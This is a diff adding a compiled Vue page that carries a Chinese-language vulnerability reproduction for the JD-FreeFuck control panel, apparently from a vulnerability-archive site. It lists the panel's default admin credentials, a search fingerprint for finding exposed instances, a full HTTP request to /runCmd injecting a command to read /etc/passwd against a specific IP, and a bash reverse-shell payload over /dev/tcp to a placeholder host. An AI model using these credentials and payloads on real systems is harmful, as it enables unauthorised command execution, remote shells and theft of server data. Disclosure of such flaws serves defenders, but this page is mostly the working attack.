@@ -1,0 +1,19 @@
+import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as d,c as t,a as e,b as a,d as r,e as l}from"./app-58e4a7d6.js";const c={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"JD-FreeFuck 存在后台命令执行漏洞，由于传参执行命令时没有对内容过滤，导致可以执行任意命令，控制服务器",-1),u={href:"https://github.com/meselson/JD-FreeFuck",target:"_blank",rel:"noopener noreferrer"},h=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>JD-FreeFuck
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;京东薅羊毛控制面板&quot;
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问后登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101952995.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>默认账号密码为</p><p><strong>useradmin/supermanito</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101952574.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送如下请求包执行命令</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /runCmd HTTP/1.1
+Host: 101.200.189.251:5678
+Content-Length: 50
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U
+Connection: close
+
+cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&amp;delay=500
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 cmd 参数存在命令注入</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101952947.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹shell</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>cmd=bash+jd.sh+%3Bbash+-c+&#39;exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261&#39;%3B+now&amp;delay=500
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101952367.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="" tabindex="-1"><a class="header-anchor" href="#" aria-hidden="true">#</a></h2>`,18);function m(g,v){const n=s("ExternalLinkIcon");return d(),t("div",null,[o,p,e("p",null,[a("项目地址： "),e("a",u,[a("https://github.com/meselson/JD-FreeFuck"),r(n)])]),h])}const f=i(c,[["render",m],["__file","JD-FreeFuck 后台命令执行漏洞.html.vue"]]);export{f as default};
